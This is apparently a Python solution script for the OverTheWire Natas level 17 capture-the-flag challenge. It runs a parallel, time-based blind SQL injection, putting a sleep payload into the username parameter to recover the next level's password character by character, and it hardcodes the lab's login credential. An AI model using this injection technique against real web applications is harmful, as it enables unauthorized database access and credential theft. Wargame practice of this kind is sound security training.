import requests
import aiohttp
import asyncio
import os
import string
from aiohttp import ClientSession
"""
This script is designed to for a fast Blind-SQL Injection on the Wargame
Overthewire - Natas - Level 17

It uses parallel threads that send a SQL-Injection request to get the password:
    * If the request was TRUE, it will sleep for 5 seconds
    * If the request was FALSE, the next request will be fired

We let each thread write on the same buffer. Since the 'TRUE'-Request will be last,
the buffer will contain the true password.

Usage: python3 natas17.py
"""


url = 'http://natas17.natas.labs.overthewire.org/'
result = {} # Buffer to store the password in
async def makeQuery(query, session):
    """Given a query, execute it and store the result in the password buffer."""
    # Request Header with URL and Authentication cookie
    async with session.request(method='GET', url=query, auth=aiohttp.BasicAuth('natas17',
        '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')) as resp:

        data = await resp.text()    # HTTP-Response, we don't use the data, just the time it was received.
        print(query)                # [DEBUG] Print the request that was send

        # Check which Password position the request checked.
        index = query.split("password,")[1].split('))')[0]
        index = str(33-int(index))

        # Get the Ascii-Character the request checked
        ascii_char = chr(int(query.split('= "')[1].split('" and')[0]))
        # Write down in the character in the Result-Buffer
        # Since the request containing the correct password will be last
        # the result buffer will have the right value.
        result[index] = ascii_char
        return True

async def main():
    """Main handler for the parallel threads."""
    async with ClientSession() as session:
        # Create a task for all the queries
        tasks = [asyncio.create_task(makeQuery(query,session)) for query in allQueries]
        # Wait until all the queries are finished
        results = await asyncio.gather(*tasks)


# Create all the queries that are to be sent.
if __name__ == '__main__':
    allQueries= []

    # Password is always 32 characters long
    for i in range(1,33):
        # Try all the ascii values that are not special characters
        for j in range(33,127):
            # Tranlated query: If (password[i] == ASCII(j)) then sleep(5) else do nothing
            query = '?username=natas18" and ASCII(Right(password,' + str(i)+ ')) = "' + str(j) + '" and sleep(5) or " '
            allQueries += [url+query]

    # Release the Kraken!
    asyncio.run(main())

    # Collect Result from Result buffer
    endResult = ""
    for i in range (1,33):
        endResult += result[str(i)]

    print(f"The Password for Natas 18 is: {endResult}")
